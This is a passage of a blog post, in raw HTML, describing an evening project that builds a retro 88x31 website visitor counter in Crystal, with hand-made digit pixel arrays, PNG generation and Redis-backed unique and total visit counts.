                            https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Evening Project: A Crystal based super fast visitor counter">
            </figure>

            <section>
                <div>
                    <p>I have taken this week's holidays with the plan that the Overkill Workbench materials would be delivered today, but in the end, it will be delivered on Sunday, so I have a lot of free time on my hands.</p><p>Yesterday, while talking with some friends, I remembered old good &lt;2008 websites, portals, and how we created them; one of the most prominent features I loved about that period was 88x31, and 120x60 sized Ad's/Counters and other goodies. It was always a fight between website authors fighting for a higher number of page visits and similar metrics. Nowadays, everything is hidden and typical, only seen by webmasters on Google Analytics and similar tools.</p><p>So today's my evening project is <a href="https://crystal-lang.org/">Crystal</a> language-based 88x31 website visitor counter image rendered entirely in <a href="https://crystal-lang.org/">Crystal</a>.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-60.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-60.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-60.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-60.png 1600w, https://www.techprowd.com/content/images/2020/09/image-60.png 1754w" sizes="(min-width: 720px) 720px"></figure><h2 id="requirements-">Requirements:</h2><ul><li>A single endpoint would return 88x31 sized png with numbers</li><li>Provide two numbers, one unique visitor count, and other total visits.</li><li>Do not depend on external libraries for image generation.</li><li>Use the least amount of resources like memory and disk space. (Maybe one day my blog will be viral, who knows)</li><li>Most important, be as fast as possible!</li></ul><h2 id="architecture-">Architecture:</h2><p>The plan is to run the crystal internal HTTP server without any overhangs and host it on Heroku free plan.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-61.png" alt=""></figure><p>Store user identifiers in Redis for uniqueness measurement and fast lookup (Remember we need speed)</p><figure><img src="https://www.techprowd.com/content/images/2020/09/source.gif" alt=""></figure><p>I found a shard (Crystal libraries are called shards) for image rendering, which can generate a PNG image using raw X, Y pixel information no external libraries used.</p><figure><a href="https://github.com/stumpycr/stumpy_png"><div><p>stumpycr/stumpy_png</p><p>Read/Write PNG images in pure Crystal. Contribute to stumpycr/stumpy_png development by creating an account on GitHub.</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>GitHub</span></p></div><p><img src="https://avatars0.githubusercontent.com/u/27729351?s=400&amp;v=4"></p></a></figure><p>For Redis client, I am going to use this shard:</p><figure><a href="https://github.com/stefanwille/crystal-redis"><div><p>stefanwille/crystal-redis</p><p>Full featured Redis client for Crystal. Contribute to stefanwille/crystal-redis development by creating an account on GitHub.</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>stefanwille</span><span>GitHub</span></p></div><p><img src="https://avatars2.githubusercontent.com/u/331756?s=400&amp;v=4"></p></a></figure><h2 id="step-1-rendering-image">Step 1: Rendering image</h2><p>As I have chosen image size to be 88x31, I need to try to fit two numbers. Total visits - Every load counts and Unique Visitors - Number of unique visitors.</p><p>I have drawn some sample representation I imagine in Photoshop:</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-62.png" alt=""></figure><p>It looks tiny on my 4K monitor, but back in 2005, it looked huge on my 1024x768 monitor.</p><p>One of the problems now that I am not using external libraries is that I have no simple way to render text on the image. That's not a big deal, remembering practices I used for Graphical LCD/OLED on embedded electronic projects. I will create an array of Tuples of 3 uint8 integers of each pixel information in a 7x10 array for each number.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-64.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-64.png 600w, https://www.techprowd.com/content/images/2020/09/image-64.png 800w" sizes="(min-width: 720px) 720px"></figure><p>To make each number in array format, I need to generate 7x10 images of each number. Then using the <a href="https://javl.github.io/image2cpp/">https://javl.github.io/image2cpp/</a> tool, I generated arrays for each character.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%2520%2520%2520%2520ONE%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x4d4e4e%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x9b9c9c%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200x939393%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D%2520%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520ZERO%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x59595a%252C%25200x6e6f6f%252C%25200x646465%252C%25200x212222%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x939393%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200xb3b3b3%252C%25200x323233%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200xa4a4a4%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x787879%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x939393%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x939393%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x404141%252C%25200xa4a4a4%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x787879%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200xababab%252C%25200x4d4e4e%252C%25200x0a0b0c%252C%25200x212222%252C%25200xababab%252C%25200x404141%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x646465%252C%25200xb3b3b3%252C%25200x939393%252C%25200xababab%252C%25200x828282%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x212222%252C%25200x4d4e4e%252C%25200x323233%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D"><img src="https://www.techprowd.com/content/images/2020/09/carbon--19-.png" alt="carbon--19-"></a></p>
<!--kg-card-end: markdown--><p>Now that I have pixel data of each character, I can finally create a whole image.</p><p>Knowing the array's exact size, in our case, it's 7x10; we can loop through the array and fill in all pixels referenced from a given position.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=module%2520VisitorCounter%253A%253ACharacters%250A%2520%2520%2520%2520CHARACTER_WIDTH%2520%253D%25207%250A%2520%2520%2520%2520CHARACTER_HEIGHT%2520%253D%252010%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520TWO%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x59595a%252C%25200x6e6f6f%252C%25200x646465%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x828282%252C%25200x9b9c9c%252C%25200x6e6f6f%252C%25200x939393%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x323233%252C%25200xababab%252C%25200x212222%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200xa4a4a4%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x323233%252C%25200x646465%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x9b9c9c%252C%25200x404141%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x646465%252C%25200x939393%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x8b8b8b%252C%25200x787879%252C%25200x212222%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x404141%252C%25200x939393%252C%25200x404141%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x9b9c9c%252C%25200x212222%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520ONE%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x4d4e4e%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x9b9c9c%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200x939393%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D%2520%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520ZERO%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x59595a%252C%25200x6e6f6f%252C%25200x646465%252C%25200x212222%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x939393%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200xb3b3b3%252C%25200x323233%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200xa4a4a4%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520"><img src="https://www.techprowd.com/content/images/2020/09/carbon--20-.png" alt="carbon--20-"></a></p>
<!--kg-card-end: markdown--><p>After trying out <code>VisitorCounter::Characters.render_character</code> function I was able to see it working correctly.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-65.png" alt=""></figure><p>Now it's time to wrap it all and make the main function, which would generate and return generated image as <code>IO::Memory</code> buffer.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/carbon--21--1.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/carbon--21--1.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/carbon--21--1.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/carbon--21--1.png 1600w, https://www.techprowd.com/content/images/2020/09/carbon--21--1.png 2048w" sizes="(min-width: 720px) 720px"></figure><p>To make more usable, I added this image generator to a simple HTTP server and returned random numbers generated in response.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=require%2520%2522stumpy_png%2522%250Ainclude%2520StumpyPNG%250Arequire%2520%2522http%252Fserver%2522%250Arequire%2520%2522.%252Fvisitor_counter%252F*%2522%250A%250Aserver%2520%253D%2520HTTP%253A%253AServer.new%2520do%2520%257Ccontext%257C%250A%2520%2520context.response.content_type%2520%253D%2520%2522image%252Fpng%2522%250A%250A%2520%2520image%2520%253D%2520VisitorCounter%253A%253AImageGenerator.generate(%250A%2520%2520%2520%2520Random.new.rand(1..99999999)%252C%250A%2520%2520%2520%2520Random.new.rand(1..99999999)%252C%250A%2520%2520)%250A%250A%2520%2520context.response.content_length%2520%253D%2520image.size%250A%2520%2520IO.copy(image%252C%2520context.response)%250Aend%250A%250Aaddress%2520%253D%2520server.bind_tcp%25208080%250Aputs%2520%2522Listening%2520on%2520http%253A%252F%252F%2523%257Baddress%257D%2522%250Aserver.listen%250A"><img src="https://www.techprowd.com/content/images/2020/09/carbon--22-.png" alt="carbon--22-"></a></p>
<!--kg-card-end: markdown--><p>After running this code and going to <code>http://127.0.0.1:8080</code> I received generated image with random numbers.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-66.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-66.png 600w, https://www.techprowd.com/content/images/2020/09/image-66.png 612w"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-67.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-67.png 600w, https://www.techprowd.com/content/images/2020/09/image-67.png 612w"></figure><p>Now we can move on to a more exciting part, which is counting visitors.</p><h2 id="step-2-counting-visitors">Step 2: Counting Visitors</h2><p>To count visitors first, we need some kind of unique value. In this project, I am going to use the IP address of the client. As I plan to host this on Heroku, I know that IP will only be IPv4, so I can safely convert the IP address from 127.0.0.1 to its bytes equivalent by merging all 4 x Int8 parts of IP this way it will take less space in Redis memory 4 bytes instead of 15 bytes.</p><p>This is a function which extracts IP address from request. As I mentioned before, this will be hosted on Heroku, so the client IP address will be available in the HTTP header <code>X-Forwarded-For</code> as a load balancer will replace the client IP address with its own.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=private%2520def%2520extract_ip(request)%250A%2520%2520%2520%2520ip%2520%253D%2520request.headers%255B%2522X-Forwarded-For%2522%255D%253F%250A%2520%2520%2520%2520if%2520ip.nil%253F%250A%2520%2520%2520%2520%2520%2520%2520%2520case%2520remote_address%2520%253D%2520request.remote_address%250A%2520%2520%2520%2520%2520%2520%2520%2520when%2520Socket%253A%253AIPAddress%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520ip%2520%253D%2520remote_address.address%250A%2520%2520%2520%2520%2520%2520%2520%2520else%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520ip%2520%253D%2520nil%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520unless%2520ip.nil%253F%250A%2520%2520%2520%2520%2520%2520a%252C%2520b%252C%2520c%252C%2520d%2520%253D%2520ip.split(%27.%27)%250A%250A%2520%2520%2520%2520%2520%2520ip_address%2520%253D%2520Slice(UInt8).new(4)%250A%2520%2520%2520%2520%2520%2520ip_address%255B0%255D%2520%253D%2520a.to_u8%250A%2520%2520%2520%2520%2520%2520ip_address%255B1%255D%2520%253D%2520b.to_u8%250A%2520%2520%2520%2520%2520%2520ip_address%255B2%255D%2520%253D%2520c.to_u8%250A%2520%2520%2520%2520%2520%2520ip_address%255B3%255D%2520%253D%2520d.to_u8%250A%250A%2520%2520%2520%2520%2520%2520return%2520String.new(ip_address)%250A%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520nil%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--25-.png" alt="carbon--25-"></a></p>
<!--kg-card-end: markdown--><p>If the IP address is not available for some reason, I will skip this visit from a unique visit count and just increase the total visit count.</p><p>Now wrapping everything into <code>WebHandler</code>, which will nicely integrate into HTTP Server, we should have a working counter.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=module%2520VisitorCounter%250A%2520%2520%2520%2520class%2520WebHandler%250A%2520%2520%2520%2520%2520%2520%2520%2520include%2520HTTP%253A%253AHandler%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520UNIQUE_VISITS_OFFSET_KEY%2520%253D%2520%2522UNIQUE_VISITS_OFFSET%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520TOTAL_VISITS_OFFSET_KEY%2520%253D%2520%2522TOTAL_VISITS_OFFSET%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520TOTAL_VISITS_KEY%2520%253D%2520%2522TOTAL_VISITS%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520UNIQUE_VISITS_KEY%2520%253D%2520%2522UNIQUE_VISITS%2522%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520def%2520initialize(redis%2520%253A%2520Redis%253A%253APooledClient)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis%2520%253D%2520redis%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520def%2520call(context)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.headers%255B%2522Server%2522%255D%2520%253D%2520%2522Techprowd%2520Visitor%2520Counter%2520v1.0%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520unless%2520context.request.method%2520%253D%253D%2520%2522GET%2522%2520%257C%257C%2520context.request.method%2520%253D%253D%2520%2522HEAD%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.status_code%2520%253D%2520405%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.headers.add(%2522Allow%2522%252C%2520%2522GET%252C%2520HEAD%2522)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520context.request.path.not_nil!%2520!%253D%2520%2522%252F%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520call_next(context)%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520ip_address%2520%253D%2520extract_ip(context.request)%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520unless%2520ip_address.nil%253F%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520increase_total_visits(ip_address)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520increase_unique_visits(ip_address)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520image%2520%253D%2520ImageGenerator.generate(%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520get_total_visits()%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520get_unique_visits()%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520)%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.content_type%2520%253D%2520%2522image%252Fpng%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.content_length%2520%253D%2520image.size%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520IO.copy(image%252C%2520context.response)%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520increase_total_visits(ip)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.incr(TOTAL_VISITS_KEY).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520increase_unique_visits(ip)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520%2540redis.exists(ip)%2520%253D%253D%25200%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.set(ip%252C%25201)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.incr(UNIQUE_VISITS_KEY).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520get_unique_visits%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520(%2540redis.get(UNIQUE_VISITS_KEY)%2520%257C%257C%2520%25220%2522).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520get_total_visits%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520(%2540redis.get(TOTAL_VISITS_KEY)%2520%257C%257C%2520%25220%2522).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%2520%2520%2520%2520end%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--35-.png" alt="carbon--35-"></a></p>
<!--kg-card-end: markdown--><p>The main file code should look like this right now:</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=require%2520%2522stumpy_png%2522%250Arequire%2520%2522http%252Fserver%2522%250Arequire%2520%2522http%252Fserver%252Fhandlers%252F*%2522%250Arequire%2520%2522redis%2522%250A%250Arequire%2520%2522.%252Fvisitor_counter%252F*%2522%250A%250Ainclude%2520StumpyPNG%250A%250Amodule%2520VisitorCounter%250A%2520%2520VERSION%2520%253D%2520%25220.1.0%2522%250A%250A%2520%2520ENV%255B%2522PORT%2522%255D%2520%257C%257C%253D%2520%25228080%2522%250A%2520%2520ENV%255B%2522REDIS_URL%2522%255D%2520%257C%257C%253D%2520%2522redis%253A%252F%252F127.0.0.1%252F%2522%250A%250A%2520%2520redis%2520%253D%2520Redis%253A%253APooledClient.new(url%253A%2520ENV%255B%2522REDIS_URL%2522%255D)%250A%250A%2520%2520server%2520%253D%2520HTTP%253A%253AServer.new(%255B%250A%2520%2520%2520%2520HTTP%253A%253AErrorHandler.new%252C%250A%2520%2520%2520%2520HTTP%253A%253ALogHandler.new%252C%250A%2520%2520%2520%2520HTTP%253A%253ACompressHandler.new%252C%250A%2520%2520%2520%2520VisitorCounter%253A%253AWebHandler.new(redis)%252C%250A%2520%2520%255D)%250A%250A%2520%2520address%2520%253D%2520server.bind_tcp%2520%25220.0.0.0%2522%252CENV%255B%2522PORT%2522%255D.to_i%250A%2520%2520puts%2520%2522Listening%2520on%2520http%253A%252F%252F%2523%257Baddress%257D%2522%250A%2520%2520server.listen%250Aend"><img 